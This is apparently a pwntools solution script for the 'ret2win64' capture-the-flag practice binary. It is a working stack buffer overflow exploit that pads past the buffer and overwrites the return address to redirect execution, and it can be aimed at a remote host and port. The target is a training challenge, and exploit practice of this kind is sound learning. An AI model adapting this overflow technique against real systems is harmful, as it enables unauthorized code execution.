#!/usr/bin/env python
from pwn import *
import sys

context.terminal = ['tmux','splitw','-h']

def exploit(r):
   
    r.recvuntil("> ")
    buf = ""
    buf += "A" * cyclic_find("faaaaaaag",n=8)
    buf += p64(0x0000000000400811)
    r.sendline(buf)
    r.interactive()
    return





if __name__ == "__main__":
    log.info("For remote %s HOST PORT" % sys.argv[0])
    

    name_binary = "./ret2win64"
    e = ELF(name_binary)

    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        r = process(name_binary)     #put binary here
        print util.proc.pidof(r)
        gdb_cmd = [
            "c"


        ]
        gdb.attach(r, gdbscript = "\n".join(gdb_cmd))
        #r = process("./LOLgame", env={"LD_PRELOAD" : "./libc.so.6.remote"})
        #pause()
        exploit(r)










